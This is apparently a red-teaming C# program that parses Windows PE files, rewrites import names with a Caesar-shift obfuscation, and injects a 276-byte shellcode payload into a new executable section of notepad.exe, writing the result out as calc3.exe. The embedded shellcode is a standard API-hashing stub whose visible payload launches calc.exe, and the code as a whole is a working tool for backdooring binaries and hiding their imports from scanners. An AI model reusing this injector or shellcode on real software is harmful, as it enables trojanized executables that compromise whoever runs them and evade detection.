using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace apihashing
{
    public partial class Program
    {

        public static  int GetImageSize(byte[] payload)
        {
            int imagesize = 0;

            byte[] lfanew = new byte[64];
            for(int i = 0; i < lfanew.Length; i++)
            {
                lfanew[i] = payload[i+60];
            }

            int ntheaderoffset = BitConverter.ToInt32(lfanew, 0);
            int sizeoffset;

            if (IntPtr.Size == 8)
            {

                 sizeoffset = Marshal.OffsetOf(typeof(IMAGE_OPTIONAL_HEADER64), "SizeOfImage").ToInt32();
            
            }
            else
            {
                 sizeoffset = Marshal.OffsetOf(typeof(IMAGE_OPTIONAL_HEADER32), "SizeOfImage").ToInt32();

            }

            //Console.WriteLine((4+20+sizeoffset).ToString("X"));
            int imagesizeoffset = (4 + Marshal.SizeOf(typeof(IMAGE_FILE_HEADER)) + sizeoffset);

            byte[] sizeofimage = new byte[4];
            for(int i = 0; i < sizeofimage.Length; i++)
            {
                sizeofimage[i] = payload[ntheaderoffset +i + imagesizeoffset];
            }

            imagesize = BitConverter.ToInt32(sizeofimage, 0);

            return imagesize;
        }

        public static int GetHeadersSize(byte[] payload)
        {
            int headerssize = 0;

            byte[] lfanew = new byte[64];
            for (int i = 0; i < lfanew.Length; i++)
            {
                lfanew[i] = payload[i + 60];
            }

            int ntheaderoffset = BitConverter.ToInt32(lfanew, 0);
            int sizeoffset;
            if (IntPtr.Size == 8)
            {

                sizeoffset = Marshal.OffsetOf(typeof(IMAGE_OPTIONAL_HEADER64), "SizeOfHeaders").ToInt32();

            }
            else
            {
                sizeoffset = Marshal.OffsetOf(typeof(IMAGE_OPTIONAL_HEADER32), "SizeOfHeaders").ToInt32();

            }

            //Console.WriteLine((4 + 20 + sizeoffset).ToString("X"));
            int imagesizeoffset = (4 + Marshal.SizeOf(typeof(IMAGE_FILE_HEADER)) + sizeoffset);

            byte[] sizeofimage = new byte[4];
            for (int i = 0; i < sizeofimage.Length; i++)
            {
                sizeofimage[i] = payload[ntheaderoffset + i + imagesizeoffset];
            }

            headerssize = BitConverter.ToInt32(sizeofimage, 0);

            return headerssize;
        }


        public static string Obfuscate(string plainstring,int shift)
        {
            string obfuscatedstring = "";
            // A B C D,1    0+1=1  B
            char[] uppercase = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z' };
            char[] lowercase = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z' };

            int luckynumber = shift%uppercase.Length;
            
            foreach(char i in plainstring)
            {
                bool ispresent = false;
                for(int j = 0; j < uppercase.Length; j++)
                {
                    if (uppercase[j] == i)
                    {
                        ispresent = true;
                        char temp = uppercase[(j + luckynumber) % uppercase.Length];
                        obfuscatedstring += temp;
                    }
                }
                for (int j = 0; j < lowercase.Length; j++)
                {
                    if (lowercase[j] == i)
                    {
                        ispresent = true;
                        char temp = lowercase[(j + luckynumber) % uppercase.Length];
                        obfuscatedstring += temp;
                    }
                }
                if (ispresent == false)
                {
                    obfuscatedstring += i;
                }

            }

            return obfuscatedstring;
        }


        public static string Deobfuscate(string sourcestring,int shift)
        {
            string original = "";

            char[] uppercase = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z' };
            char[] lowercase = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z' };

            int luckynumber = (26-shift) % uppercase.Length;

            foreach (char i in sourcestring)
            {
                bool ispresent = false;
                for (int j = 0; j < uppercase.Length; j++)
                {
                    if (uppercase[j] == i)
                    {
                        ispresent = true;
                        char temp = uppercase[(j + luckynumber)%uppercase.Length];
                        original += temp;
                    }
                }
                for (int j = 0; j < lowercase.Length; j++)
                {
                    if (lowercase[j] == i)
                    {
                        ispresent = true;
                        char temp = lowercase[(j + luckynumber) % uppercase.Length];
                        original += temp;
                    }
                }
                if (ispresent == false)
                {
                    original += i;
                }

            }
            return original;
        }

        public static void ReplaceInFile(byte[] payload,string oldstring,string newstring)
        {

            for(int i = 0; i < (payload.Length-oldstring.Length); i++)
            {
               string temp=  Encoding.ASCII.GetString(payload, i, oldstring.Length);

                if (temp == oldstring)
                {
                    for(int j = 0; j < oldstring.Length; j++)
                    {
                        payload[i + j] = (byte) newstring[j];
                    }
                }
                
            }

            File.WriteAllBytes(@"D:\red teaming tools\calc3.exe", payload);

        }


        public static void ParsePE64(byte[] payload)
        {
            StringWriter sw = new StringWriter();
            int imagesize = GetImageSize(payload);

            IntPtr baseaddress = VirtualAlloc(IntPtr.Zero,(uint) imagesize, 0x00001000 | 0x00002000, 0x04);
            sw.WriteLine("Base address: {0}",baseaddress.ToString("X"));
            
            int headerssize = GetHeadersSize(payload);

            // copying all headers into process's memory
            Marshal.Copy(payload, 0, baseaddress, headerssize);


            #region marshalling into structures

            IMAGE_DOS_HEADER dosheader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(baseaddress, typeof(IMAGE_DOS_HEADER));
            sw.WriteLine("DOS HEADER");
            sw.WriteLine("MagicBytes: {0}", new string(dosheader.e_magic));
            sw.WriteLine();


            

            IMAGE_NT_HEADERS64 ntheader = new IMAGE_NT_HEADERS64();
            ntheader.Signature = (uint)Marshal.ReadInt32(baseaddress + dosheader.e_lfanew);
           
            sw.WriteLine("Signature: {0}",ntheader.Signature.ToString("X"));
            sw.WriteLine();

             sw.WriteLine("FILE HEADER");
            ntheader.FileHeader = (IMAGE_FILE_HEADER)Marshal.PtrToStructure(baseaddress + dosheader.e_lfanew + Marshal.SizeOf(ntheader.Signature), typeof(IMAGE_FILE_HEADER));
            sw.WriteLine("32bit or 64bit? {0}", ntheader.FileHeader.Machine.ToString("X"));
            sw.WriteLine("Number of Sections: {0}", ntheader.FileHeader.NumberOfSections.ToString());
            sw.WriteLine("Size of Optional Header: {0}", ntheader.FileHeader.SizeOfOptionalHeader);
            sw.WriteLine();

            sw.WriteLine("OPTIONAL HEADER");
            ntheader.OptionalHeader = (IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(
                baseaddress+dosheader.e_lfanew+4+Marshal.SizeOf(ntheader.FileHeader),
                typeof(IMAGE_OPTIONAL_HEADER64)
                );
            sw.WriteLine("Magic Bit: {0}", ntheader.OptionalHeader.Magic.ToString("X"));
            sw.WriteLine("Address of EntryPoint: {0}", ntheader.OptionalHeader.AddressOfEntryPoint.ToString("X"));
            sw.WriteLine("Preferred ImageBase: {0}", ntheader.OptionalHeader.ImageBase.ToString("X"));
            sw.WriteLine("Section Alignment: {0}", ntheader.OptionalHeader.SectionAlignment.ToString("X"));
            sw.WriteLine("File Alignment: {0}", ntheader.OptionalHeader.FileAlignment.ToString("X"));
            sw.WriteLine("Image Size: {0}", ntheader.OptionalHeader.SizeOfImage.ToString("X"));
            sw.WriteLine("Headers Size: {0}", ntheader.OptionalHeader.SizeOfHeaders.ToString("X"));
            sw.WriteLine();

            IntPtr firstsectionoffset = baseaddress + dosheader.e_lfanew + Marshal.SizeOf(ntheader);
            IMAGE_SECTION_HEADER[] sections = new IMAGE_SECTION_HEADER[ntheader.FileHeader.NumberOfSections];
            for(int i = 0; i < ntheader.FileHeader.NumberOfSections; i++)
            {    

                sections[i]=(IMAGE_SECTION_HEADER) Marshal.PtrToStructure(firstsectionoffset+(i*Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))),typeof(IMAGE_SECTION_HEADER));
                sw.WriteLine("Section Name: {0}",Encoding.ASCII.GetString(sections[i].Name));
                sw.WriteLine("Raw offset: {0}",sections[i].PointerToRawData.ToString("X"));
                sw.WriteLine("Raw Size: {0}", sections[i].SizeOfRawData);
                sw.WriteLine("Virtual Offset RVA: {0}", sections[i].VirtualAddress);
                 sw.WriteLine("Virtual Size: {0}", sections[i].VirtualSize);
                 sw.WriteLine();
            }


            #endregion


            #region allocating sections
            //Console.WriteLine(sw.ToString());

            for (int i = 0; i < ntheader.FileHeader.NumberOfSections; i++)
            {
                byte[] temp = new byte[sections[i].VirtualSize];
                for (int j = 0; j < temp.Length; j++)
                {
                   temp[j]= payload[sections[i].PointerToRawData+j];
                }

                Marshal.Copy(temp, 0, (IntPtr)(baseaddress.ToInt64() + sections[i].VirtualAddress), temp.Length);

            }



            #endregion


            #region parsing exports


            long exportoffset = ntheader.OptionalHeader.ExportTable.VirtualAddress;

            if (exportoffset != 0)
            {


                IMAGE_EXPORT_DIRECTORY export = (IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure((IntPtr)(baseaddress.ToInt64() + exportoffset), typeof(IMAGE_EXPORT_DIRECTORY));

                string dllname= Marshal.PtrToStringAnsi( (IntPtr)(baseaddress.ToInt64() + export.Name));

                sw.WriteLine("Exported dllname: {0}",dllname);
                sw.WriteLine("Number of functions: {0}", export.NumberOfFunctions.ToString("X"));
                sw.WriteLine("Number of Names: {0}", export.NumberOfNames.ToString("X"));

                for(int i = 0; i < export.NumberOfFunctions; i++)
                {

                    int functionnameoffset = Marshal.ReadInt32((IntPtr)(baseaddress.ToInt64() + export.AddressOfNames + (i * 4)));
                   // Console.WriteLine(functionoffset.ToString("X"));
                    string functionname= Marshal.PtrToStringAnsi((IntPtr)(baseaddress.ToInt64() +functionnameoffset ));


                    int indexordinal = Marshal.ReadInt16((IntPtr)(baseaddress.ToInt64()+export.AddressOfNameOrdinals+(i*2)));

                    int functionaddressoffset=Marshal.ReadInt32((IntPtr)(baseaddress.ToInt64() + export.AddressOfFunctions + (indexordinal * 4)));

                    //int functionaddress = Marshal.ReadInt32((IntPtr)(baseaddress.ToInt64() + functionaddressoffset ));

                    sw.WriteLine("Functionname: {0}, indexordinal: {1},address: {2}",functionname,indexordinal,functionaddressoffset.ToString("X"));


                }
               


            }

            #endregion



            #region parsing imports


            IntPtr importtableptr = (IntPtr)( baseaddress.ToInt64()+ntheader.OptionalHeader.ImportTable.VirtualAddress);

            IMAGE_IMPORT_DESCRIPTOR firstimport = (IMAGE_IMPORT_DESCRIPTOR) Marshal.PtrToStructure(importtableptr, typeof(IMAGE_IMPORT_DESCRIPTOR));

            while (firstimport.OriginalFirstThunk != 0)
            {

                IntPtr dllnameoffset = (IntPtr)(baseaddress.ToInt64() + firstimport.Name);
               string dllname= Marshal.PtrToStringAnsi(dllnameoffset);
                //sw.WriteLine("DllImport: {0}", dllname);

              //  ReplaceInFile(payload, dllname, Obfuscate(dllname,1));


                IntPtr originalfirstthunkptr = (IntPtr)(baseaddress.ToInt64() + firstimport.OriginalFirstThunk);
                long firstfunctionoffset = Marshal.ReadInt64(originalfirstthunkptr);

                while (firstfunctionoffset != 0)
                {
                    IntPtr function1 = (IntPtr)(baseaddress.ToInt64() + firstfunctionoffset);

                    string functionname = Marshal.PtrToStringAnsi(function1 + 2);
                   // sw.WriteLine(functionname);
                    //sw.WriteLine(functionname);

                    originalfirstthunkptr += IntPtr.Size;
                    firstfunctionoffset = Marshal.ReadInt64(originalfirstthunkptr);

                  //  ReplaceInFile(payload, functionname, Obfuscate(functionname,1));
                
                }

                importtableptr += Marshal.SizeOf(typeof(IMAGE_IMPORT_DESCRIPTOR));
               firstimport= (IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(importtableptr, typeof(IMAGE_IMPORT_DESCRIPTOR));
            }


            #endregion


            //MessageBox.Show(sw.ToString(),"PE Information");
            Console.WriteLine(sw.ToString());



            VirtualFree(baseaddress, 0, 0x00008000);

        }



        public static void ObfuscateImports(byte[] payload)
        {
            StringWriter sw = new StringWriter();
            int imagesize = GetImageSize(payload);

            IntPtr baseaddress = VirtualAlloc(IntPtr.Zero, (uint)imagesize, 0x00001000 | 0x00002000, 0x04);
            sw.WriteLine("Base address: {0}", baseaddress.ToString("X"));

            int headerssize = GetHeadersSize(payload);

            // copying all headers into process's memory
            Marshal.Copy(payload, 0, baseaddress, headerssize);


            #region marshalling into structures

            IMAGE_DOS_HEADER dosheader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(baseaddress, typeof(IMAGE_DOS_HEADER));
            sw.WriteLine("DOS HEADER");
            sw.WriteLine("MagicBytes: {0}", new string(dosheader.e_magic));
            sw.WriteLine();




            IMAGE_NT_HEADERS64 ntheader = new IMAGE_NT_HEADERS64();
            ntheader.Signature = (uint)Marshal.ReadInt32(baseaddress + dosheader.e_lfanew);

            sw.WriteLine("Signature: {0}", ntheader.Signature.ToString("X"));
            sw.WriteLine();

            sw.WriteLine("FILE HEADER");
            ntheader.FileHeader = (IMAGE_FILE_HEADER)Marshal.PtrToStructure(baseaddress + dosheader.e_lfanew + Marshal.SizeOf(ntheader.Signature), typeof(IMAGE_FILE_HEADER));
            sw.WriteLine("32bit or 64bit? {0}", ntheader.FileHeader.Machine.ToString("X"));
            sw.WriteLine("Number of Sections: {0}", ntheader.FileHeader.NumberOfSections.ToString());
            sw.WriteLine("Size of Optional Header: {0}", ntheader.FileHeader.SizeOfOptionalHeader);
            sw.WriteLine();

            sw.WriteLine("OPTIONAL HEADER");
            ntheader.OptionalHeader = (IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(
                baseaddress + dosheader.e_lfanew + 4 + Marshal.SizeOf(ntheader.FileHeader),
                typeof(IMAGE_OPTIONAL_HEADER64)
                );
            sw.WriteLine("Magic Bit: {0}", ntheader.OptionalHeader.Magic.ToString("X"));
            sw.WriteLine("Address of EntryPoint: {0}", ntheader.OptionalHeader.AddressOfEntryPoint.ToString("X"));
            sw.WriteLine("Preferred ImageBase: {0}", ntheader.OptionalHeader.ImageBase.ToString("X"));
            sw.WriteLine("Section Alignment: {0}", ntheader.OptionalHeader.SectionAlignment.ToString("X"));
            sw.WriteLine("File Alignment: {0}", ntheader.OptionalHeader.FileAlignment.ToString("X"));
            sw.WriteLine("Image Size: {0}", ntheader.OptionalHeader.SizeOfImage.ToString("X"));
            sw.WriteLine("Headers Size: {0}", ntheader.OptionalHeader.SizeOfHeaders.ToString("X"));
            sw.WriteLine();

            IntPtr firstsectionoffset = baseaddress + dosheader.e_lfanew + Marshal.SizeOf(ntheader);
            IMAGE_SECTION_HEADER[] sections = new IMAGE_SECTION_HEADER[ntheader.FileHeader.NumberOfSections];
            for (int i = 0; i < ntheader.FileHeader.NumberOfSections; i++)
            {

                sections[i] = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(firstsectionoffset + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))), typeof(IMAGE_SECTION_HEADER));
                sw.WriteLine("Section Name: {0}", Encoding.ASCII.GetString(sections[i].Name));
                sw.WriteLine("Raw offset: {0}", sections[i].PointerToRawData.ToString("X"));
                sw.WriteLine("Raw Size: {0}", sections[i].SizeOfRawData);
                sw.WriteLine("Virtual Offset RVA: {0}", sections[i].VirtualAddress);
                sw.WriteLine("Virtual Size: {0}", sections[i].VirtualSize);
                sw.WriteLine();
            }


            #endregion


            #region allocating sections
            //Console.WriteLine(sw.ToString());

            for (int i = 0; i < ntheader.FileHeader.NumberOfSections; i++)
            {
                byte[] temp = new byte[sections[i].VirtualSize];
                for (int j = 0; j < temp.Length; j++)
                {
                    temp[j] = payload[sections[i].PointerToRawData + j];
                }

                Marshal.Copy(temp, 0, (IntPtr)(baseaddress.ToInt64() + sections[i].VirtualAddress), temp.Length);

            }



            #endregion


            #region parsing imports


            IntPtr importtableptr = (IntPtr)(baseaddress.ToInt64() + ntheader.OptionalHeader.ImportTable.VirtualAddress);

            IMAGE_IMPORT_DESCRIPTOR firstimport = (IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(importtableptr, typeof(IMAGE_IMPORT_DESCRIPTOR));

            while (firstimport.OriginalFirstThunk != 0)
            {

                IntPtr dllnameoffset = (IntPtr)(baseaddress.ToInt64() + firstimport.Name);
                string dllname = Marshal.PtrToStringAnsi(dllnameoffset);
                sw.WriteLine("DllImport: {0}", dllname);

                
                ReplaceInFile(payload, dllname, Obfuscate(dllname,1));


                IntPtr originalfirstthunkptr = (IntPtr)(baseaddress.ToInt64() + firstimport.OriginalFirstThunk);
                long firstfunctionoffset = Marshal.ReadInt64(originalfirstthunkptr);

                while (firstfunctionoffset != 0)
                {
                    IntPtr function1 = (IntPtr)(baseaddress.ToInt64() + firstfunctionoffset);

                    string functionname = Marshal.PtrToStringAnsi(function1 + 2);
                    sw.WriteLine(functionname);
                    

                    originalfirstthunkptr += IntPtr.Size;
                    firstfunctionoffset = Marshal.ReadInt64(originalfirstthunkptr);

                      ReplaceInFile(payload, functionname, Obfuscate(functionname,1));

                }

                importtableptr += Marshal.SizeOf(typeof(IMAGE_IMPORT_DESCRIPTOR));
                firstimport = (IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(importtableptr, typeof(IMAGE_IMPORT_DESCRIPTOR));
            }


            #endregion


            //MessageBox.Show(sw.ToString(),"PE Information");
            Console.WriteLine(sw.ToString());



            VirtualFree(baseaddress, 0, 0x00008000);

        }


        public static void ParsePE32(byte[] payload)
        {
            StringWriter sw = new StringWriter();
            int imagesize = GetImageSize(payload);

            IntPtr baseaddress = VirtualAlloc(IntPtr.Zero, (uint)imagesize, 0x00001000 | 0x00002000, 0x04);
            sw.WriteLine("Base address: {0}", baseaddress.ToString("X"));

            int headerssize = GetHeadersSize(payload);

            // copying all headers into process's memory
            Marshal.Copy(payload, 0, baseaddress, headerssize);


            #region marshalling into structures

            IMAGE_DOS_HEADER dosheader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(baseaddress, typeof(IMAGE_DOS_HEADER));
            sw.WriteLine("DOS HEADER");
            sw.WriteLine("MagicBytes: {0}", new string(dosheader.e_magic));
            sw.WriteLine();

            IMAGE_NT_HEADERS32 ntheader = new IMAGE_NT_HEADERS32();
            ntheader.Signature = (uint)Marshal.ReadInt32(baseaddress + dosheader.e_lfanew);

            sw.WriteLine("Signature: {0}", ntheader.Signature.ToString("X"));
            sw.WriteLine();

            sw.WriteLine("FILE HEADER");
            ntheader.FileHeader = (IMAGE_FILE_HEADER)Marshal.PtrToStructure(baseaddress + dosheader.e_lfanew + Marshal.SizeOf(ntheader.Signature), typeof(IMAGE_FILE_HEADER));
            sw.WriteLine("32bit or 64bit? {0}", ntheader.FileHeader.Machine.ToString("X"));
            sw.WriteLine("Number of Sections: {0}", ntheader.FileHeader.NumberOfSections.ToString());
            sw.WriteLine("Size of Optional Header: {0}", ntheader.FileHeader.SizeOfOptionalHeader);
            sw.WriteLine();

            sw.WriteLine("OPTIONAL HEADER");
            sw.WriteLine("OPTIONAL HEADER");
            ntheader.OptionalHeader = (IMAGE_OPTIONAL_HEADER32)Marshal.PtrToStructure(
                baseaddress + dosheader.e_lfanew + 4 + Marshal.SizeOf(ntheader.FileHeader),
                typeof(IMAGE_OPTIONAL_HEADER32)
                );
            sw.WriteLine("Magic Bit: {0}", ntheader.OptionalHeader.Magic.ToString("X"));
            sw.WriteLine("Address of EntryPoint: {0}", ntheader.OptionalHeader.AddressOfEntryPoint.ToString("X"));
            sw.WriteLine("Preferred ImageBase: {0}", ntheader.OptionalHeader.ImageBase.ToString("X"));
            sw.WriteLine("Section Alignment: {0}", ntheader.OptionalHeader.SectionAlignment.ToString("X"));
            sw.WriteLine("File Alignment: {0}", ntheader.OptionalHeader.FileAlignment.ToString("X"));
            sw.WriteLine("Image Size: {0}", ntheader.OptionalHeader.SizeOfImage.ToString("X"));
            sw.WriteLine("Headers Size: {0}", ntheader.OptionalHeader.SizeOfHeaders.ToString("X"));
            sw.WriteLine();

            IntPtr firstsectionoffset = baseaddress + dosheader.e_lfanew + Marshal.SizeOf(ntheader);
            IMAGE_SECTION_HEADER[] sections = new IMAGE_SECTION_HEADER[ntheader.FileHeader.NumberOfSections];
            for (int i = 0; i < ntheader.FileHeader.NumberOfSections; i++)
            {

                sections[i] = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(firstsectionoffset + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))), typeof(IMAGE_SECTION_HEADER));
                sw.WriteLine("Section Name: {0}", Encoding.ASCII.GetString(sections[i].Name));
                sw.WriteLine("Raw offset: {0}", sections[i].PointerToRawData.ToString("X"));
                sw.WriteLine("Raw Size: {0}", sections[i].SizeOfRawData);
                sw.WriteLine("Virtual Offset RVA: {0}", sections[i].VirtualAddress);
                sw.WriteLine("Virtual Size: {0}", sections[i].VirtualSize);
                sw.WriteLine();
            }

            #endregion


            Console.WriteLine(sw.ToString());

            VirtualFree(baseaddress, 0, 0x00008000);

        }


        public static void AddSection(byte[] payload,byte[] shellcode)
        {

           int imagesize = GetImageSize(payload);
           
           Console.WriteLine(payload.Length.ToString("X"));


            int shellcodesize = shellcode.Length;

            int newsize= (512*((shellcodesize / 512) + 1));
            int totalsize = (payload.Length+newsize);

            Console.WriteLine("Final size: {0}",totalsize.ToString("X"));
            Console.WriteLine("New section virtual size: {0}",shellcode.Length.ToString("X"));

            IntPtr baseaddress = VirtualAlloc(IntPtr.Zero, (uint) (totalsize), 0x00001000 | 0x00002000, 0x04);
            Console.WriteLine(baseaddress.ToString("X"));
            Marshal.Copy(payload, 0, baseaddress, payload.Length);

            Marshal.Copy(shellcode, 0, baseaddress + payload.Length, shellcode.Length);


            IMAGE_DOS_HEADER dosheader = (IMAGE_DOS_HEADER) Marshal.PtrToStructure(baseaddress, typeof(IMAGE_DOS_HEADER));
            IMAGE_NT_HEADERS64 ntheader = new IMAGE_NT_HEADERS64();

            ntheader.Signature = (uint)Marshal.ReadInt32(baseaddress + dosheader.e_lfanew);
            ntheader.FileHeader = (IMAGE_FILE_HEADER) Marshal.PtrToStructure(baseaddress + dosheader.e_lfanew + 4, typeof(IMAGE_FILE_HEADER));
            ntheader.OptionalHeader = (IMAGE_OPTIONAL_HEADER64) Marshal.PtrToStructure(
                baseaddress+dosheader.e_lfanew+4+Marshal.SizeOf(ntheader.FileHeader),
                typeof(IMAGE_OPTIONAL_HEADER64)
                );


            IMAGE_SECTION_HEADER[] oldsections = new IMAGE_SECTION_HEADER[ntheader.FileHeader.NumberOfSections];
            IntPtr firstsectionoffset = baseaddress + dosheader.e_lfanew + Marshal.SizeOf(ntheader);
            
            for(int i = 0; i < ntheader.FileHeader.NumberOfSections; i++)
            {

                oldsections[i] = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(firstsectionoffset+(i*Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))), typeof(IMAGE_SECTION_HEADER));

               // Console.WriteLine(Encoding.ASCII.GetString(oldsections[i].Name));

            }



            int numberofsectionsoffset = Marshal.OffsetOf(typeof(IMAGE_FILE_HEADER), "NumberOfSections").ToInt32();
            Console.WriteLine(numberofsectionsoffset);
            int sections =Marshal.ReadInt16((IntPtr)(baseaddress.ToInt64() + dosheader.e_lfanew + 4 + numberofsectionsoffset));
            sections += 1;
            ntheader.FileHeader.NumberOfSections += 1;

            // updating sections
            Marshal.WriteInt16(baseaddress + dosheader.e_lfanew + 6, (short)sections);

            IMAGE_SECTION_HEADER newsection = new IMAGE_SECTION_HEADER();
            ntheader.OptionalHeader.SizeOfHeaders += (uint) Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER));

            // updating sizeofheaders
            int sizeofheadersoffset = Marshal.OffsetOf(typeof(IMAGE_OPTIONAL_HEADER64), "SizeOfHeaders").ToInt32();
            Marshal.WriteInt32(baseaddress + dosheader.e_lfanew + 4 + 20 + sizeofheadersoffset,(int) ntheader.OptionalHeader.SizeOfHeaders);


            newsection.Name = Encoding.ASCII.GetBytes(".dummy69");
            newsection.PointerToRawData = (uint)payload.Length;
            newsection.SizeOfRawData = (uint)( totalsize - payload.Length);
            newsection.VirtualSize = (uint)shellcode.Length;

            uint newvirtualaddress = oldsections[oldsections.Length - 1].VirtualAddress + ntheader.OptionalHeader.SectionAlignment;
            Console.WriteLine(newvirtualaddress.ToString("X"));

            newsection.VirtualAddress = newvirtualaddress;
            newsection.PointerToLinenumbers = 0;
            newsection.NumberOfLinenumbers = 0;
            newsection.NumberOfRelocations = 0;
            newsection.Characteristics = DataSectionFlags.MemoryExecute | DataSectionFlags.MemoryRead | DataSectionFlags.ContentCode; //0x60000020;
           

            ntheader.OptionalHeader.SizeOfImage = newsection.VirtualAddress + newsection.VirtualSize;

            int sizeofimageoffset = Marshal.OffsetOf(typeof(IMAGE_OPTIONAL_HEADER64), "SizeOfImage").ToInt32();

            Marshal.WriteInt32(baseaddress + dosheader.e_lfanew + 4 + 20 + sizeofimageoffset,(int)ntheader.OptionalHeader.SizeOfImage);


            byte[] dummysection = new byte[Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))];

            IntPtr ptr=Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)));
            Marshal.StructureToPtr(newsection, ptr, true);
            Marshal.Copy(ptr, dummysection, 0, dummysection.Length);
            Marshal.FreeHGlobal(ptr);

            long sectionwrite = dosheader.e_lfanew +
                Marshal.SizeOf(ntheader) +
                ((ntheader.FileHeader.NumberOfSections - 1) * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)));
            
            
            Console.WriteLine("sectionheader writeoffset: {0}",sectionwrite.ToString("X"));

            // writing section header
            Marshal.Copy(dummysection, 0, (IntPtr)(baseaddress.ToInt64() +sectionwrite), dummysection.Length);


            byte[] newfile = new byte[totalsize];
            Marshal.Copy(baseaddress, newfile, 0, newfile.Length);

            File.WriteAllBytes(@"D:\red teaming tools\calc3.exe", newfile);

            VirtualFree(baseaddress, 0, 0x00008000);

        }


        static void Main(string[] args)
        {


             // string filepath = @"D:\red teaming tools\calc2.exe";
            //  string filepath = @"D:\red teaming tools\PE-bear_0.5.5.3_x64_win_vs13\msvcr120.dll";
            //string filepath = @"C:\Windows\System32\Kernel32.dll";

            string filepath = @"C:\Windows\notepad.exe";



            byte[] payload = File.ReadAllBytes(filepath);

            int imagesize = GetImageSize(payload);

            byte[] shellcode = new byte[276] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
0x63,0x2e,0x65,0x78,0x65,0x00 };


            AddSection(payload,shellcode);

           // ParsePE64(payload);
          //  ObfuscateImports(payload);
            Console.ReadKey();
            
        }
    }
}
